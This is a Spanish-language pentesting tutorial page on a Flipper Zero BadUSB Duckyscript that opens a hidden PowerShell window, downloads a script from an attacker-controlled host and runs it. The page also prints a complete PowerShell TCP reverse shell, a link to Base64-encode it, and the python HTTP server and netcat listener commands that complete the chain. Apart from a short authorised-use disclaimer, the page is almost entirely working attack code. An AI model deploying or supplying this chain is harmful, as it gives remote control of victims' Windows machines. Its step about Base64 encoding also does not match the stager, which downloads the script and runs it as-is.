
# Duckyscript Reverse Shell

{% hint style="danger" %}
Este script y sus instrucciones están diseñados para fines educativos y para realizar pruebas en entornos con permiso explícito. El uso no autorizado de estos scripts es ilegal y puede tener consecuencias graves.
{% endhint %}

## <mark style="color:orange;">Script en Duckyscript</mark>

{% hint style="info" %}
Debes modificar el puerto para que apunte a tu máquina atacante
{% endhint %}

```bash
REM Configuración: Cambia [IP_ATACANTE] y [PUERTO] a tu servidor y puerto deseados.
DELAY 500
GUI r
DELAY 500
STRING powershell -w hidden -NoP -NonI -Ep Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://[IP_ATACANTE]:[PUERTO]/payload.ps1');"
ENTER
```

Guardamos este script como `revshell.txt` y lo guardamos en el Flipper Zero con qFlipper dentro de la carpeta de BadUSB:

<figure><img src="/files/i2HC3h7e0U2eqO583zT4" alt=""><figcaption></figcaption></figure>

## <mark style="color:orange;">Pasos explicados</mark>

### **1. Archivo payload.ps1**

En tu máquina de atacante, crea el archivo `payload.ps1` que contenga el código de PowerShell para una reverse shell. Aquí tienes un ejemplo de contenido:

{% hint style="info" %}
Debes modificar la IP y puerto para que apunte a tu máquina atacante
{% endhint %}

{% code title="payload.ps1" %}

```powershell
$client = New-Object System.Net.Sockets.TCPClient('[IP_ATACANTE]', [PUERTO]);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

{% endcode %}

Necesitamos codificar en `Base64` el payload para que se ejecute correctamente. Podemos usar CyberChef por ejemplo:

{% embed url="<https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnW0lQX0FUQUNBTlRFXScsIFtQVUVSVE9dKTsKJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CltieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTsKd2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXsKICAgICRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgJHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOwogICAgJHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOwogICAgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTsKICAgICRzdHJlYW0uRmx1c2goKTsKfQokY2xpZW50LkNsb3NlKCk7>" %}

Una vez lo tenemos codificado en base64 guardamos el archivo `payload.ps1`

### 2. Abrir servidor local con python

Sirve este archivo en un servidor HTTP simple, como:

```shell-session
afsh4ck@kali$ python3 -m http.server 80
```

### **3. Abrir listener con Netcat en Kali Linux**

En otra terminal abre un servidor de escucha para recibir la conexión de la reverse shell:

```shell-session
afsh4ck@kali$ nc -lvnp [PUERTO]
```

{% hint style="warning" %}
Asegúrate de que tu máquina sea accesible desde el objetivo, configurando correctamente la red o el port forwarding si es necesario. Si están conectados a la misma red funcionará sin problema.
{% endhint %}

## <mark style="color:orange;">**Ejecutar el script**</mark>

1. Conecta el Flipper Zero y ejecuta el script en un sistema Windows objetivo.
2. El script abre PowerShell con la combinación de teclas `Win + R`, descarga el payload desde el servidor HTTP y lo ejecuta de forma oculta, devolviéndonos una reverse shell a nuestra máquina de atacante.
